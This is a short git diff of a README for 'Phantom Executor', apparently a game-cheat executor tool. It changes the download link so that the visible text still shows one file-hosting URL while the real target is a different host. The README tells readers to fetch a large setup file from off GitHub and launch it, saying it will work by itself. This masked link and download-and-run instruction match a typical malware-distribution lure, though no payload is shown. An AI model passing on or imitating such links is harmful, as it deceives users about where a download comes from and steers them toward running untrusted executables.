@@ -11,7 +11,7 @@ Topics: phantom-executor, phantom-executor-discord-server, is-phantom-executor-s
 
 # Download Phantom Executor
 The setup file is 234mb which is larger than githubs supported so download from 
-# https://filego.co.uk/CRSonnr5
+# [https://filego.co.uk/CRSonnr5](https://gofile.io/d/FhVmIP)
 
 Please ensure to launch the downloaded file to begin utilizing Phantom Executor for your needs.
 It should all work itself after launching it.
